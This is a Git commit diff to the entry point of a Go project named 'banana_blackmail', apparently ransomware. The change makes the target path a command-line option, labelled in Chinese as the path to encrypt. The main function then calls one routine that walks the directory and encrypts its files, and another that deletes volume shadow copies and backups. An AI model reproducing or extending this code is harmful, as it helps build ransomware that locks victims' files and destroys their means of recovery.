072f19aa27a6146639784067551149bb7ba231c4
内蒙古上单 <83812544+Ed1s0nZ@users.noreply.github.com>
2021-09-30 14:35:40 +0800

    Update main.go

--- banana_blackmail/blackmail/main.go
+++ banana_blackmail/blackmail/main.go
@@ -6,7 +6,10 @@ import (
 )
 
 func main() {
-	pathName := "C:/Users/13107/Desktop/识别沙箱检测"
+	var pathName string
+	flag.StringVar(&pathName, "pathName", "C:/Users/13107/Desktop/识别沙箱检测", "输入要加密的路径")
+	flag.Parse()
+// 	pathName := "C:/Users/13107/Desktop/识别沙箱检测"
 	Directory_traversal.Directory_traversal(pathName) // 加密文件
 	Delete_VSSADMIN.Delete_VSSADMIN()                 // 删除卷影、备份等
 }
